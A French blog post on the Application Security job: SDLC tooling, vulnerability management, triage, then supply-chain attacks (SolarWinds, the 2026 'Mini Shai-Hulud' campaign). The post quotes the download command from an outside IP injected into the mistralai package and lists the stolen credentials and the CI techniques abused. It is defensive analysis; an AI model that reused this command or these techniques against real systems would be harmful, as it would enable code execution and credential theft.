---
title: L'AppSec, ce n'est pas lancer le scanner. C'est tout ce qui vient après.
date: 2026-08-20
tags: [appsec, devsecops, supply-chain, sdlc]
summary: Ce que fait réellement un ingénieur Application Security tout au long du cycle de développement — quel outil couvre quelle étape, comment une plateforme de gestion des vulnérabilités transforme leurs sorties en chiffres défendables en comité de direction, pourquoi le triage est le vrai métier, et comment la chaîne d'approvisionnement logicielle est passée de note de bas de page à menace principale entre SolarWinds et la compromission du SDK Mistral AI.
translationKey: application-security-role
slug: appsec-tout-ce-qui-vient-apres
---

Le métier est facile à mal décrire. « Ingénieur Application Security : lance des
outils de sécurité sur le code. » Cette description est techniquement vraie et
totalement inutile, exactement comme « pompier : manie une lance ».

Acheter des scanners, c'est un bon de commande. Transformer leurs sorties en
code corrigé, dans une base de code qui ne vous appartient pas, écrite par des
gens qui ont leur propre roadmap et qui ne vous ont pas demandé votre avis,
voilà le métier. **L'outillage produit des constats. L'AppSec produit des
décisions.**

Voici à quoi cela ressemble sur un cycle de développement, ce que chaque outil
sait vraiment faire, pourquoi le triage occupe l'essentiel de la semaine, et
pourquoi la moitié intéressante du modèle de menace a complètement quitté votre
dépôt.

## Où l'AppSec intervient dans le cycle de développement

Pas partout à la fois, et pas avec le même poids. Le coût d'une correction
augmente à chaque étape qu'elle survit, donc l'effort est délibérément placé le
plus tôt possible :

| Étape | Ce que fait l'AppSec | Outillage typique |
| --- | --- | --- |
| Conception | Modélisation des menaces, frontières d'authentification, « par où entre la donnée non fiable » | Tableau blanc, STRIDE, une vraie conversation |
| Code | Analyse statique, détection de secrets, revue des dépendances sur la pull request | SAST, scanners de secrets, SCA |
| Build | Durcissement du pipeline, provenance des artefacts, scan d'images | SLSA/attestations, scanners de conteneurs, `zizmor` |
| Déploiement | Revue de l'infrastructure-as-code, dérive de configuration, surface exposée | Scanners IaC, policy-as-code |
| Exécution | Tests en boîte noire, triage du bug bounty, appui aux incidents | DAST, télémétrie WAF, détection à l'exécution |
| Toutes | Agrégation des sorties de tous les scanners, suivi des états, reporting | DefectDojo, GitLab Ultimate |

<figure class="diagram">
<svg viewBox="0 0 720 214" role="img" aria-labelledby="fig1t">
  <title id="fig1t">Les cinq étapes du cycle de développement, l'outillage qui couvre chacune d'elles, et la couche de gestion des vulnérabilités qui les agrège toutes.</title>
  <defs><marker id="a1" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <rect class="d-box" x="8"   y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="148" y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="288" y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="428" y="16" width="120" height="36" rx="4"/>
  <rect class="d-box" x="568" y="16" width="120" height="36" rx="4"/>
  <text class="d-t d-b" x="68"  y="39" text-anchor="middle">conception</text>
  <text class="d-t d-b" x="208" y="39" text-anchor="middle">code</text>
  <text class="d-t d-b" x="348" y="39" text-anchor="middle">build</text>
  <text class="d-t d-b" x="488" y="39" text-anchor="middle">déploiement</text>
  <text class="d-t d-b" x="628" y="39" text-anchor="middle">exécution</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a1)">
    <path d="M130,34 H145"/><path d="M270,34 H285"/>
    <path d="M410,34 H425"/><path d="M550,34 H565"/>
  </g>
  <text class="d-m" x="68"  y="70" text-anchor="middle">modèle de menace</text>
  <text class="d-m" x="68"  y="84" text-anchor="middle">limites de confiance</text>
  <text class="d-m" x="208" y="70" text-anchor="middle">SAST</text>
  <text class="d-m" x="208" y="84" text-anchor="middle">détection secrets</text>
  <text class="d-m" x="208" y="98" text-anchor="middle">SCA</text>
  <text class="d-m" x="348" y="70" text-anchor="middle">provenance</text>
  <text class="d-m" x="348" y="84" text-anchor="middle">scan d'images</text>
  <text class="d-m" x="348" y="98" text-anchor="middle">lint des workflows</text>
  <text class="d-m" x="488" y="70" text-anchor="middle">scan de l'IaC</text>
  <text class="d-m" x="488" y="84" text-anchor="middle">policy as code</text>
  <text class="d-m" x="628" y="70" text-anchor="middle">DAST</text>
  <text class="d-m" x="628" y="84" text-anchor="middle">détection runtime</text>
  <g class="d-dash">
    <path d="M68,108  V126"/><path d="M208,108 V126"/><path d="M348,108 V126"/>
    <path d="M488,108 V126"/><path d="M628,108 V126"/>
  </g>
  <rect class="d-box-a" x="8" y="126" width="680" height="44" rx="4"/>
  <text class="d-a d-b" x="348" y="145" text-anchor="middle">gestion des vulnérabilités</text>
  <text class="d-m"     x="348" y="161" text-anchor="middle">DefectDojo · GitLab Ultimate — déduplication, état, responsable, tendance</text>
  <polygon class="d-fill" points="8,208 688,198 688,208" opacity="0.5"/>
  <text class="d-m" x="8"   y="192">corriger ne coûte presque rien ici</text>
  <text class="d-m" x="688" y="192" text-anchor="end">…et des ordres de grandeur plus cher ici</text>
</svg>
<figcaption>Chaque étape a son outillage ; seule l'étape de conception n'en a pas, et c'est justement celle où les décisions sont les moins chères à changer. La couche d'agrégation couvre les cinq, ce qui est précisément ce qui rend comparables les chiffres de la section suivante.</figcaption>
</figure>

L'étape de conception a le pire outillage et le meilleur levier. Un modèle
d'autorisation faux au tableau blanc produit cent constats SAST six mois plus
tard, dont aucun ne dit « le modèle d'autorisation est faux ». Aucun scanner n'a
jamais trouvé un contrôle de tenant manquant que le code implémente de manière
cohérente et incorrecte partout.

C'est la première chose à intérioriser sur ce rôle : **les outils couvrent les
classes de bugs qui se généralisent, et vous couvrez celles qui ne se
généralisent pas.**

## La boîte à outils, et ce que chaque outil ne voit pas

Chaque catégorie ci-dessous mérite d'exister. Chacune a un angle mort qui
détermine la façon dont vous devez lire ses sorties.

**SAST** — analyse statique, lit le code sans l'exécuter. Bon en suivi de
teintes : une entrée utilisateur qui atteint une chaîne SQL, un appel shell, un
désérialiseur. Aveugle à tout ce qui dépend de l'état d'exécution. Il ne sait
pas que l'endpoint est derrière une passerelle réservée aux administrateurs, il
signalera donc la même injection dans un handler public et dans un script de
migration interne avec une criticité identique. Son taux de faux positifs est à
lui seul la raison d'être du triage.

**SCA** — software composition analysis, confronte votre arbre de dépendances
aux bases de vulnérabilités. Bon sur « vous livrez `log4j-core 2.14.1` et ce
n'est pas une bonne idée ». Aveugle dans deux directions à la fois : il signale
des CVE dans des chemins de code que vous n'appelez jamais, et il ne dit
absolument rien d'un paquet malveillant, parce qu'un malware n'obtient pas de
CVE avant d'être publié. Retenez bien ce second point — c'est toute la raison
d'être de la dernière section de cet article.

**Détection de secrets** — regex et entropie sur les sources, l'historique et
les sorties de build. Peu coûteuse, à fort signal, et c'est le contrôle que je
garderais si je ne pouvais en garder qu'un seul. Le piège, c'est que trouver un
secret représente 10 % du travail : le constat est une *fuite*, pas un *bug*, et
le correctif est une rotation, pas un commit. Une clé retirée du code et laissée
valide en production, c'est un ticket fermé et un risque intact.

**DAST** — tests dynamiques contre une instance en cours d'exécution. Il voit ce
qui répond réellement sur le réseau, ce qui en fait le seul outil de la liste
capable de confirmer l'exploitabilité plutôt que de la déduire. En contrepartie
il est lent, exige un vrai environnement avec une vraie authentification, et
n'atteint que ce qu'il peut parcourir. Tout ce qui se cache derrière un
enchaînement métier en plusieurs étapes lui est invisible.

**Scan d'IaC et de pipelines** — Terraform, manifestes Kubernetes, workflows
GitHub Actions. Les workflows méritent une attention particulière : un workflow
avec des permissions d'écriture sur un jeton, c'est du code de production avec
un shell dedans, et il n'est presque jamais relu comme du code de production.

Aucune de ces catégories ne remplace les autres, et chacune parle son propre
dialecte : échelles de criticité différentes, identifiants différents, formats
de sortie différents, aucune notion partagée permettant de savoir si deux
constats sont le même constat. Empilées sans un endroit où atterrir, elles
multiplient le bruit plutôt que la couverture.

## Gestion des vulnérabilités : la couche qui rend tout cela dénombrable

Dès l'instant où vous faites tourner plus de deux scanners, le goulot
d'étranglement cesse d'être la détection et devient la comptabilité. Six outils
sur quarante dépôts, chacun avec son propre tableau de bord, ce n'est pas un
programme de sécurité — ce sont six backlogs que personne ne porte, et aucun
moyen de répondre à « est-ce qu'on s'améliore ? ».

La solution est une plateforme de gestion des vulnérabilités : **DefectDojo**
par exemple si vous voulez la voie open source, **GitLab Ultimate** (là encore,
quelque chose avec quoi j'ai travaillé, mais il existe d'autres outils) si votre
organisation y vit déjà et que vous voulez que les constats atterrissent dans la
merge request. D'autres existent, et la catégorie compte davantage que le
produit. Toutes ingèrent les sorties de scanners — la plupart des outils
émettent du SARIF ou un format natif que la plateforme sait déjà parser — et la
plateforme devient l'endroit unique où un constat possède un état.

Ce que vous en tirez et que les outils individuels ne peuvent pas vous donner :

- **La déduplication.** La même clé en dur trouvée par le scanner de secrets, le
  moteur SAST et le scanner de conteneurs, c'est un seul problème, pas trois.
  Sans déduplication, vos chiffres sont gonflés par le nombre d'outils que vous
  avez achetés.
- **Un état persistant d'un scan à l'autre.** Un constat que vous avez trié en
  faux positif en mars reste trié en avril. C'est la propriété qui permet à la
  discipline de mise en sourdine de survivre au contact d'un pipeline nocturne —
  sinon chaque scan ressuscite chacune des décisions que vous avez déjà prises.
- **Responsabilité et cycle de vie.** Chaque constat a une équipe, une criticité
  que vous avez attribuée plutôt que celle devinée par l'outil, une échéance et
  un statut. Cela se synchronise avec Jira ou les tickets GitLab pour que les
  développeurs travaillent dans leur propre outil de suivi.
- **Visibilité sur la couverture.** Quels dépôts sont scannés par quoi. Le trou
  que vous ne voyez pas est pire que les constats que vous voyez — un service
  non scanné est un zéro dans tous les rapports, et un zéro ressemble à une
  bonne nouvelle.
- **L'historique.** Qui est tout l'objet de la partie suivante.

<figure class="diagram">
<svg viewBox="0 0 720 252" role="img" aria-labelledby="fig3t">
  <title id="fig3t">Cinq scanners alimentent une plateforme de gestion des vulnérabilités, qui produit deux jeux de métriques différents : des métriques opérationnelles pour l'ingénierie et des métriques de risque pour la direction.</title>
  <defs><marker id="a3" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <rect class="d-box" x="8" y="24"  width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="62"  width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="100" width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="138" width="118" height="26" rx="4"/>
  <rect class="d-box" x="8" y="176" width="118" height="26" rx="4"/>
  <text class="d-m" x="67" y="41"  text-anchor="middle">SAST</text>
  <text class="d-m" x="67" y="79"  text-anchor="middle">SCA</text>
  <text class="d-m" x="67" y="117" text-anchor="middle">détection secrets</text>
  <text class="d-m" x="67" y="155" text-anchor="middle">DAST</text>
  <text class="d-m" x="67" y="193" text-anchor="middle">IaC / pipeline</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a3)">
    <path d="M128,37  C152,37 156,100 174,104"/>
    <path d="M128,75  C152,75 156,110 174,112"/>
    <path d="M128,113 H174"/>
    <path d="M128,151 C152,151 156,124 174,120"/>
    <path d="M128,189 C152,189 156,132 174,128"/>
  </g>
  <rect class="d-box-a" x="176" y="60" width="150" height="130" rx="4"/>
  <text class="d-a d-b" x="251" y="102" text-anchor="middle">gestion des</text>
  <text class="d-a d-b" x="251" y="118" text-anchor="middle">vulnérabilités</text>
  <text class="d-m"     x="251" y="142" text-anchor="middle">dédup · état</text>
  <text class="d-m"     x="251" y="156" text-anchor="middle">responsable · suivi</text>
  <g class="d-arrow-a" color="var(--accent)" marker-end="url(#a3)">
    <path d="M328,110 C350,110 352,86 372,86"/>
    <path d="M328,140 C350,140 352,188 372,188"/>
  </g>
  <rect class="d-box" x="374" y="42" width="338" height="88" rx="4"/>
  <text class="d-t d-b" x="390" y="62">aux ingénieurs</text>
  <text class="d-m" x="390" y="82">constats ouverts par équipe et par service</text>
  <text class="d-m" x="390" y="98">délai moyen de remédiation, par criticité</text>
  <text class="d-m" x="390" y="114">taux d'introduction vs taux de remédiation</text>
  <rect class="d-box" x="374" y="144" width="338" height="104" rx="4"/>
  <text class="d-t d-b" x="390" y="164">à la direction, au risque et à l'audit</text>
  <text class="d-m" x="390" y="184">couverture des scanners en % du parc</text>
  <text class="d-m" x="390" y="200">exposition des services exposés à Internet</text>
  <text class="d-m" x="390" y="216">tendance d'un trimestre à l'autre, en une ligne</text>
  <text class="d-m" x="390" y="232">preuves pour ISO 27001 / SOC 2 / PCI</text>
</svg>
<figcaption>Les mêmes données, deux vocabulaires. La plateforme existe pour que la colonne de gauche puisse gagner un scanner de plus sans que la colonne de droite change de forme — ce qui est exactement la raison pour laquelle le nombre brut de constats est la mauvaise chose à remonter.</figcaption>
</figure>

### Des chiffres qui veulent dire quelque chose pour chaque public

C'est là que la plateforme justifie son coût, parce que les deux conversations
que vous devez tenir sont complètement différentes.

**Aux ingénieurs et aux managers d'ingénierie**, les métriques utiles sont
opérationnelles :

- constats ouverts par criticité **par équipe et par service**, suivis dans le
  temps
- **délai moyen de remédiation**, ventilé par criticité — c'est le chiffre qui
  vous dit si le processus fonctionne
- **taux d'introduction contre taux de remédiation** : est-ce qu'on ferme plus
  vite qu'on n'ouvre ? Un backlog stable avec un débit élevé, c'est une équipe
  en bonne santé ; un backlog qui grossit, c'est une conversation sur les
  moyens, pas un rappel à l'ordre
- distribution par âge du backlog, et combien de constats ont dépassé
  l'échéance convenue

**À la direction, au risque et à l'audit**, rien de tout cela ne porte. Il leur
faut :

- **la couverture des scanners en pourcentage du parc**, parce que c'est une
  affirmation de maturité sur laquelle ils peuvent agir avec du budget
- **l'exposition concentrée là où elle compte** — les constats critiques sur les
  services exposés à Internet ou manipulant des données, pas un décompte global
- **la tendance**, en une ligne : « les constats critiques de plus de 30 jours
  sont passés de 40 à 6 ce trimestre ». La direction bat la valeur absolue à
  tous les coups
- **des preuves pour la conformité.** ISO 27001, SOC 2, PCI DSS et maintenant le
  CRA demandent tous une variante de « montrez-moi que vous trouvez et corrigez
  les vulnérabilités selon un calendrier défini ». Une plateforme de gestion des
  vulnérabilités répond à cela avec un export plutôt qu'avec quinze jours de
  captures d'écran.

Deux mises en garde tirées de l'expérience. D'abord, **ne remontez à personne le
nombre brut de constats**. Le chiffre monte quand vous ajoutez un scanner et
descend quand vous en retirez un, ce qui veut dire qu'il mesure votre budget
d'outillage plutôt que votre risque, et qu'il punit précisément les équipes qui
travaillent le plus. La tendance et le délai de remédiation sont les métriques
honnêtes.

Ensuite, **ne laissez jamais la métrique devenir l'objectif**. « Fermer 90 % des
critiques ce trimestre » produit de façon fiable de la reclassification plutôt
que des corrections. Mesurez le processus, négociez le risque.

La plateforme est aussi ce qui transforme le triage d'une tâche en un flux de
travail — et c'est la partie du métier qui consomme réellement la semaine.

## Triage : transformer des constats en décision

Un premier scan sur une base de code mature renvoie des centaines ou des
milliers de constats. Si vous les transférez à l'équipe tels quels, vous n'avez
pas fait de travail de sécurité — vous avez fait un déni de service sur les gens
dont vous aviez besoin comme alliés, et vous ne récupérerez plus jamais leur
attention.

Le triage consiste à répondre à quatre questions par constat, dans cet ordre, en
s'arrêtant au premier « non » :

1. **Est-ce réel ?** Le point d'arrivée (le *sink*) signalé par l'outil
   existe-t-il vraiment, et la donnée l'atteint-elle réellement ? Une grande
   partie des sorties SAST meurt ici.
2. **Est-ce atteignable ?** Le chemin de code est-il invoqué dans une
   configuration déployée, par un appelant qui n'est pas déjà pleinement de
   confiance ?
3. **Qu'est-ce que cela apporte à l'attaquant ?** Une injection SQL sur une
   table en lecture seule de données de référence publiques, ce n'est pas une
   injection SQL sur la table des utilisateurs.
4. **Combien coûte le correctif ?** Une requête paramétrée d'une ligne et une
   refonte du modèle d'autorisation ont la même criticité et sont deux tickets
   complètement différents.

<figure class="diagram">
<svg viewBox="0 0 720 204" role="img" aria-labelledby="fig2t">
  <title id="fig2t">Un entonnoir de triage qui se resserre de 2 412 constats bruts de scanners à 23 tickets.</title>
  <text class="d-m" x="246" y="39"  text-anchor="end">sortie brute des scanners</text>
  <text class="d-m" x="246" y="75"  text-anchor="end">après déduplication</text>
  <text class="d-m" x="246" y="111" text-anchor="end">1. réel — le sink existe</text>
  <text class="d-m" x="246" y="147" text-anchor="end">2. atteignable en production</text>
  <text class="d-m" x="246" y="183" text-anchor="end">3–4. impact à la hauteur du coût</text>
  <rect class="d-box"  x="258" y="24"  width="380" height="22" rx="3"/>
  <rect class="d-box"  x="258" y="60"  width="262" height="22" rx="3"/>
  <rect class="d-box"  x="258" y="96"  width="140" height="22" rx="3"/>
  <rect class="d-box"  x="258" y="132" width="70"  height="22" rx="3"/>
  <rect class="d-fill" x="258" y="168" width="33"  height="22" rx="3"/>
  <text class="d-m"    x="646" y="39"  >2 412</text>
  <text class="d-m"    x="528" y="75"  >1 180</text>
  <text class="d-m"    x="406" y="111" >310</text>
  <text class="d-m"    x="336" y="147" >96</text>
  <text class="d-a d-b" x="299" y="183">23 tickets</text>
  <path class="d-dash" d="M258,20 V196"/>
</svg>
<figcaption>Forme illustrative, pas des données réelles — mais l'ordre de grandeur est le bon. Les 2 389 constats qui tombent sont mis en sourdine avec une raison écrite et conservent cet état au scan suivant ; ils ne sont pas supprimés, et ils ne sont jamais envoyés à un développeur.</figcaption>
</figure>

Seuls les constats qui survivent aux quatre questions deviennent du travail.
Tout le reste est mis en sourdine *avec une raison écrite*, parce qu'une mise en
sourdine inexpliquée est indiscernable d'une erreur six mois plus tard, quand
quelqu'un relance le scan.

La discipline de mise en sourdine est ce qui maintient l'ensemble en vie. L'état
visé est un pipeline propre où tout nouveau constat signifie que quelque chose a
changé. Un backlog de 4 000 constats rouges en permanence entraîne tout le
monde, vous compris, à ne plus lire les sorties — et c'est strictement pire que
de ne pas avoir le scanner du tout, parce que cela s'accompagne de l'illusion
d'une couverture.

Quelques heuristiques qui tiennent la route :

- **Classez par exploitabilité, pas par CVSS.** Le score a été attribué par
  quelqu'un qui n'a jamais vu votre architecture.
- **Un moyen atteignable bat un critique inatteignable.** À chaque fois.
- **Regroupez les constats par cause racine.** Quarante constats issus d'un seul
  helper de template non sûr, c'est une correction et une conversation, pas
  quarante tickets.
- **Faites la rotation d'abord, corrigez ensuite, sur tout ce qui ressemble à un
  secret.** L'identifiant est vivant dès l'instant où il est commité, pas dès
  l'instant où vous le remarquez.

## La réunion est le livrable

L'autre moitié du rôle est une réunion technique récurrente avec chaque équipe
de développement, et ce n'est pas un point d'avancement. Son objectif est de
convertir votre liste triée en *leur* backlog priorisé — avec leur contribution,
parce qu'ils savent des choses que vous ignorez.

Ce qui a tendance à marcher :

- **Apportez l'exploit, pas le constat.** « Voici une requête qui renvoie la
  facture d'un autre client » met fin au débat que « le SAST signale un IDOR »
  déclenche.
- **Venez avec le correctif, ou au moins avec sa forme.** Un patch, un helper
  sûr qu'ils peuvent réutiliser, un lien vers le motif qu'ils appliquent déjà
  correctement ailleurs.
- **Apportez leur contexte.** Leur service traite des données de paiement, donc
  il passe en premier — ça, c'est un argument. « C'est un critique » n'en est
  pas un.
- **Convenez d'une date, et écrivez-la.** Un risque accepté avec un responsable
  et une date d'expiration est un résultat légitime. Un ticket ignoré ne l'est
  pas.
- **Tuez des classes, pas des instances.** Le meilleur résultat de ces réunions,
  c'est une règle de linter, un wrapper ou un changement de template qui rend le
  bug impossible à écrire dans cette base de code à partir de maintenant. Vous
  n'aurez alors plus jamais cette réunion.

Le mode d'échec de ce rôle, c'est de devenir la personne qui transfère les
e-mails des scanners et bloque les livraisons. Les équipes contournent cette
personne, généralement en découvrant quel contrôle peut être désactivé avec un
label. **Vous n'avez aucune autorité pour corriger quoi que ce soit dans le
dépôt de quelqu'un d'autre, donc votre crédibilité, c'est votre chaîne
d'outils.**

## Puis les attaquants ont changé de cible

Tout ce qui précède suppose que la vulnérabilité se trouve dans du code écrit
par votre organisation. Pendant vingt ans cette hypothèse a été globalement
juste, et l'industrie est devenue raisonnablement bonne sur le sujet — langages
à mémoire sûre, requêtes paramétrées, frameworks avec l'échappement activé par
défaut. Écrire une application exploitable demande plus d'efforts qu'avant.

Alors les attaquants sont montés d'un cran. Si le code que vous écrivez est
durci, compromettez le code que vous *incluez* — et touchez d'un seul coup tous
les consommateurs en aval. C'est la même économie qui a fait gagner le phishing
contre la cryptanalyse.

### SolarWinds : compromettre le build

Décembre 2020. Des attaquants sont entrés dans l'environnement de build de
SolarWinds et ont inséré une porte dérobée dans Orion — pas dans le dépôt de
sources, mais dans le build, si bien que l'artefact compilé contenait du code
qu'aucun développeur n'avait jamais commité et qu'aucune revue de code n'aurait
jamais trouvé. Il était signé avec le certificat légitime de SolarWinds, parce
qu'il sortait du système de build légitime de SolarWinds. Environ 18 000 clients
ont installé la mise à jour piégée via le processus de patch normal qu'on leur
avait justement demandé de tenir à jour.

La leçon que tout le monde citait à l'époque était « la signature de code prouve
l'origine, pas l'intention ». La leçon qui comptait davantage : **votre pipeline
de build fait partie de votre surface d'attaque, et sa sortie était considérée
comme fiable par tout l'aval sans que personne n'ait de moyen de la vérifier.**

Cet unique événement est la raison pour laquelle les SBOM, l'attestation de
provenance et les builds reproductibles sont passés du monde académique aux
exigences d'achat.

### Mistral AI : compromettre le mainteneur

Avance rapide jusqu'aux 11–12 mai 2026. En cinq heures, un acteur malveillant
suivi sous le nom de TeamPCP a publié **404 versions malveillantes sur environ
172 paquets npm et 2 paquets PyPI** — la campagne que les chercheurs ont nommée
*Mini Shai-Hulud*, la quatrième vague de cette famille depuis septembre 2025. Le
rayon d'action incluait tout l'écosystème du routeur TanStack, 65 paquets
UiPath, le client d'OpenSearch à 1,3 million de téléchargements hebdomadaires,
Guardrails AI, et la suite de SDK de Mistral AI sur les deux registres.

Le versant Python en est l'illustration la plus nette. `mistralai` 2.4.6 a été
publiée par-dessus une 2.4.5 légitime, avec du code injecté dans
`mistralai/client/__init__.py` — un déclenchement à l'import, ce sur quoi il
vaut la peine de s'arrêter :

```python
# en gros ce qui a atterri dans mistralai/client/__init__.py
"curl -k -L -s https://83.142.209.194/transformers.pyz -o /tmp/transformers.pyz"
# ... exécuté en détaché, sortie supprimée
```

Se déclencher à l'**import** plutôt qu'à l'installation est une évasion
délibérée. Un `pip install` en bac à sable dans un environnement d'analyse ne
l'exécute jamais. La charge utile part au premier `import mistralai` — ce qui se
produit dans votre job de CI, ou sur le portable d'un développeur, dans un
environnement qui par définition possède des identifiants.

Le second étage était un voleur d'identifiants : clés cloud, jetons GitHub, clés
SSH, comptes de service Kubernetes, jetons Vault, jetons de publication sur les
registres. Il vérifiait son environnement avant de s'exécuter, et dans certaines
zones géographiques embarquait une branche destructrice. Il exfiltrait via une
messagerie routée en oignon plutôt qu'un C2 classique, et côté npm il *se
répliquait* — en utilisant les jetons GitHub volés pour commiter des
configurations d'IDE et d'éditeur empoisonnées dans les propres dépôts de la
victime.

Cette dernière propriété est ce qui rend cette génération différente de
SolarWinds. Il ne s'agit pas d'un éditeur compromis. C'est un ver dont le
support de propagation est les identifiants des développeurs, et chaque jeton de
publication volé est un nouveau point de départ.

<figure class="diagram">
<svg viewBox="0 0 720 262" role="img" aria-labelledby="fig4t">
  <title id="fig4t">SolarWinds a compromis le système de build d'un seul éditeur pour atteindre 18 000 clients. Mini Shai-Hulud a compromis des identifiants de mainteneurs et des CI, et se réplique avec les jetons qu'il vole.</title>
  <defs><marker id="a4" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <text class="d-t d-b" x="8" y="14">2020 · SolarWinds — compromettre le build</text>
  <rect class="d-box"   x="8"   y="26" width="130" height="38" rx="4"/>
  <rect class="d-box-a" x="168" y="26" width="150" height="38" rx="4"/>
  <rect class="d-box"   x="348" y="26" width="150" height="38" rx="4"/>
  <rect class="d-box"   x="528" y="26" width="172" height="38" rx="4"/>
  <text class="d-m"     x="73"  y="50" text-anchor="middle">dépôt source</text>
  <text class="d-a d-b" x="243" y="43" text-anchor="middle">système de build</text>
  <text class="d-m"     x="243" y="57" text-anchor="middle">backdoor injectée</text>
  <text class="d-m"     x="423" y="43" text-anchor="middle">mise à jour signée</text>
  <text class="d-m"     x="423" y="57" text-anchor="middle">certificat valide</text>
  <text class="d-t d-b" x="614" y="43" text-anchor="middle">~18 000 clients</text>
  <text class="d-m"     x="614" y="57" text-anchor="middle">qui appliquent les patchs</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a4)">
    <path d="M140,45 H164"/><path d="M320,45 H344"/><path d="M500,45 H524"/>
  </g>
  <text class="d-m" x="8" y="86">Un éditeur, un build, un seul sens. Une revue de code ne l'aurait jamais trouvé.</text>
  <path class="d-rule" d="M8,104 H700"/>
  <text class="d-t d-b" x="8" y="130">2026 · Mini Shai-Hulud — compromettre le mainteneur</text>
  <rect class="d-box-a" x="8"   y="142" width="150" height="38" rx="4"/>
  <rect class="d-box"   x="188" y="142" width="140" height="38" rx="4"/>
  <rect class="d-box"   x="358" y="142" width="140" height="38" rx="4"/>
  <rect class="d-box"   x="528" y="142" width="172" height="38" rx="4"/>
  <text class="d-a d-b" x="83"  y="159" text-anchor="middle">creds mainteneur</text>
  <text class="d-m"     x="83"  y="173" text-anchor="middle">+ CI mal configurée</text>
  <text class="d-m"     x="258" y="159" text-anchor="middle">pipeline de release</text>
  <text class="d-m"     x="258" y="173" text-anchor="middle">de confiance, inchangé</text>
  <text class="d-m"     x="428" y="159" text-anchor="middle">npm / PyPI</text>
  <text class="d-m"     x="428" y="173" text-anchor="middle">comptes officiels</text>
  <text class="d-t d-b" x="614" y="159" text-anchor="middle">404 versions</text>
  <text class="d-m"     x="614" y="173" text-anchor="middle">172 paquets, 5 heures</text>
  <g class="d-arrow" color="var(--muted)" marker-end="url(#a4)">
    <path d="M160,161 H184"/><path d="M330,161 H354"/><path d="M500,161 H524"/>
  </g>
  <path class="d-arrow-a" color="var(--accent)" marker-end="url(#a4)"
        d="M614,182 V212 H83 V186"/>
  <text class="d-am" x="348" y="228" text-anchor="middle">les jetons volés à chaque victime publient la vague suivante</text>
  <text class="d-m"  x="8"   y="252">Pas un éditeur compromis — un ver dont le support de propagation est les identifiants des développeurs.</text>
</svg>
<figcaption>Six ans d'écart, la même intuition appliquée un cran plus haut : ne pas attaquer le produit, mais ce à quoi tout l'aval fait déjà confiance. La différence, c'est la flèche de retour — SolarWinds s'arrêtait au client, celle-ci y repart.</figcaption>
</figure>

### Pourquoi votre SCA n'a rien dit

Lisez attentivement l'échec de détection, parce que c'est tout l'enjeu :

- Le paquet venait du **compte officiel**, via le **pipeline officiel**.
- Les contrôles d'intégrité **sont passés** — l'empreinte correspondait à ce qui
  avait été publié.
- Aucune CVE n'existait, parce que la version malveillante était plus récente
  que toutes les bases.
- La version 2.4.6 était un incrément parfaitement banal par rapport à la 2.4.5.

Le SCA compare votre arbre à une liste de versions connues comme mauvaises. Une
version malveillante toute fraîche n'est sur aucune liste au moment où vous
l'installez. **Le contrôle qui nous protège des dépendances vulnérables depuis
dix ans est structurellement aveugle aux dépendances malveillantes**, et aucun
réglage n'y remédie, parce que le manque est dans le modèle, pas dans la
configuration.

<figure class="diagram">
<svg viewBox="0 0 720 132" role="img" aria-labelledby="fig5t">
  <title id="fig5t">Une chronologie montrant la fenêtre entre la publication d'un paquet malveillant et sa détection, pendant laquelle aucune base de vulnérabilités ne le connaît.</title>
  <defs><marker id="a5" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="currentColor"/></marker></defs>
  <rect class="d-box" x="60" y="40" width="500" height="30" rx="3"/>
  <text class="d-m" x="310" y="59" text-anchor="middle">aucune base ne le connaît — tous les scanners sont au vert</text>
  <g class="d-rule">
    <path d="M60,36 V94"/><path d="M310,70 V94"/><path d="M560,36 V94"/>
  </g>
  <path class="d-arrow" color="var(--muted)" marker-end="url(#a5)" d="M8,86 H700"/>
  <text class="d-t d-b" x="60"  y="30" text-anchor="middle">t₀</text>
  <text class="d-m"     x="60"  y="16" text-anchor="middle">2.4.6 publiée</text>
  <circle class="d-fill" cx="310" cy="86" r="4.5"/>
  <text class="d-a d-b" x="310" y="110" text-anchor="middle">votre CI l'installe</text>
  <text class="d-m"     x="310" y="124" text-anchor="middle">contrôle d'intégrité OK · compte officiel · simple incrément de version</text>
  <text class="d-t d-b" x="560" y="30" text-anchor="middle">t₀ + heures à jours</text>
  <text class="d-m"     x="560" y="16" text-anchor="middle">détectée · CVE · retirée</text>
</svg>
<figcaption>Le contrôle qui attrape les dépendances vulnérables fonctionne par consultation d'une liste, il est donc vide exactement aussi longtemps que l'attaque est nouvelle. Un délai de carence sur les nouvelles versions déplace votre installation à droite de cette troisième ligne, ce qui en fait le contrôle le moins cher de la liste ci-dessous.</figcaption>
</figure>

Notez aussi comment l'accès a été obtenu tout au long de cette campagne :
identifiants de mainteneurs détournés, et GitHub Actions mal configurées —
`pull_request_target` exécutant du code de workflow non fiable avec un contexte
élevé, empoisonnement de cache, et jetons OIDC de courte durée récupérés
directement dans la mémoire des processus du runner. Personne n'a trouvé de bug
dans le produit de qui que ce soit. Ils ont attaqué le pipeline de publication,
que presque personne ne modélise en menace, et les mainteneurs, qui sont souvent
des bénévoles non rémunérés avec des comptes personnels et zéro budget sécurité.

## Ce que l'AppSec fait concrètement face à cela

Le travail sur la chaîne d'approvisionnement ne ressemble pas au reste du rôle.
Le code qu'il faut examiner pour vraiment durcir sa chaîne d'approvisionnement
reprend un principe qu'on se renvoie depuis des années : le **« Zero-Trust »**.

Dans cette acception, on peut appliquer plusieurs actions sur la **chaîne
d'approvisionnement** pour à la fois **atténuer** et **bloquer** ce que nous ou
les équipes sécurité définissons comme *non sûr* :

